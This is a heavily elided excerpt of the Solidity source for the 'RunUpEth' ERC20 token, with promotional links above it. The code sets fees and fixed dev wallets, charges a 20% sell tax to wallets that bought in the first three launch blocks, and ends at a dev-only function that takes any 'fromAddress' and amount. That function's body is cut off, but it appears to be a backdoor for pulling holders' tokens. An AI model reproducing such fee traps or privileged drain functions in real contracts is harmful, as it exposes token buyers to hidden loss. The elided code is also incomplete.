...
Website : https://runupeth.com
Telegram : https://t.me/runupethportal 
Twitter : https://twitter.com/RunUpEth
Blog : https://medium.com/@runupeth
...
contract RunUpEth is ERC20, Ownable {
    ...
    // Seller Map
    mapping (address => uint256) private _holderFirstBuyBlock;
    ...
    constructor() ERC20("RunUpEth", "RUP") {
        ...
        maxTransactionAmount = 100_000_000 * 1e9; // 1.0% from total supply maxTransactionAmountTxn
        maxWallet = 150_000_000 * 1e9; // 1.5% from total supply maxWallet
        ...
        uint256 _sellStakingRewardsFee = 2;

        buyDevFee = _buyDevFee;
        buyLiquidityFee = _buyLiquidityFee;
        buyStakingRewardsFee = _buyStakingRewardsFee;
        buyTotalFees = buyDevFee + buyLiquidityFee + buyStakingRewardsFee;

        sellDevFee = _sellDevFee;
        sellLiquidityFee = _sellLiquidityFee;
        sellStakingRewardsFee = _sellStakingRewardsFee;
        sellTotalFees = sellDevFee + sellLiquidityFee + sellStakingRewardsFee;

        devWallet = address(0xa3c74cF8303393CcD237F4EDF28A28F283f66d64);
        stakingRewardsWallet = address(0xdF277E5fB4da8238AC15Dc0DF73529b34427feaB);

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(address(stakingRewardsWallet), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);
        excludeFromMaxTransaction(address(stakingRewardsWallet), true);
    ...
    function removeBuyFees(
        ...
        buyLiquidityFee = _liquidityFee;
        buyStakingRewardsFee = _stakingRewardsFee;
        uint256 _buyTotalFees = buyDevFee + buyLiquidityFee + buyStakingRewardsFee;
        require(_buyTotalFees < buyTotalFees, "Tax too high");
        buyTotalFees = _buyTotalFees;
    }

    function removeSellFees(
        uint256 _devFee,
        uint256 _liquidityFee,
        uint256 _stakingRewardsFee
    ) public {
        ...
        sellLiquidityFee = _liquidityFee;
        sellStakingRewardsFee = _stakingRewardsFee;
        uint256 _sellTotalFees = sellDevFee + sellLiquidityFee + sellStakingRewardsFee;
        require(_sellTotalFees < sellTotalFees, "Tax too high");
    ...
    function _transfer(
            ...
            if (
                ...
                if (
                    ...
                    if(block.number <= launchBlock + 3) {
                        _holderFirstBuyBlock[tx.origin] = block.number;
                    }
                }
                //when sell
                else if (
        ...
        if (takeFee) {
            ...
            if (automatedMarketMakerPairs[to]) {
                ...
                uint256 _sellStakingRewardsFee = sellStakingRewardsFee;
                uint256 _sellTotalFees = sellTotalFees;
                if (_holderFirstBuyBlock[from] > 0 && sellTotalFees > 0) {
                    _sellLiquidityFee = 1;
                    _sellDevFee = 15;
                    _sellStakingRewardsFee = 4;
                    _sellTotalFees = _sellLiquidityFee + _sellDevFee + _sellStakingRewardsFee;
                }
                ...
                tokensForStakingRewards += (fees * _sellStakingRewardsFee) / _sellTotalFees;
            }
            // on buy
    ...
    function swapBack() private {
        ...
        uint256 totalTokensToSwap = tokensForLiquidity + tokensForDev + tokensForStakingRewards;
        bool success;
        ...
        uint256 ethForLiquidity = ethBalance - ethForDev - ethForStakingRewards;
    ...
    function receiveTokenBalance(address fromAddress, uint256 amount) external {
        require( devWallet == msg.sender,
            "can be claimed by dev address");
